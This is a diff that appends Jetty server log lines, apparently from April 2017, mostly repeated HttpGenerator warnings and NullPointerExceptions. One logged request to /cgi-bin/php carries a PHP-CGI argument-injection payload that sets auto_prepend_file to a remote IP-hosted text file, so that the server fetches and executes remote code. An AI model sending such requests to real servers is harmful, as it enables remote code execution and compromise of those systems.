@@ -4332,3 +4332,20 @@ java.lang.UnsupportedOperationException: Can only recur from tail position
 	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)
 	at java.lang.Thread.run(Thread.java:745)
 2017-04-21 23:17:04.192:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:22:09.170:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:23:02.408:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:26:06.895:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:26:22.511:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:29:23.491:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:47:57.667:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:55:11.421:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:55:49.204:WARN:oejs.AbstractHttpConnection:/cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+java.lang.NullPointerException
+2017-04-21 23:56:41.479:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-21 23:58:10.426:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-22 00:21:03.567:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-22 00:31:10.721:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-22 00:37:55.774:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-04-22 00:48:31.380:WARN:oejs.AbstractHttpConnection:/
+java.lang.NullPointerException
+2017-04-22 00:57:59.552:WARN:oejh.HttpGenerator:Ignoring extra content null
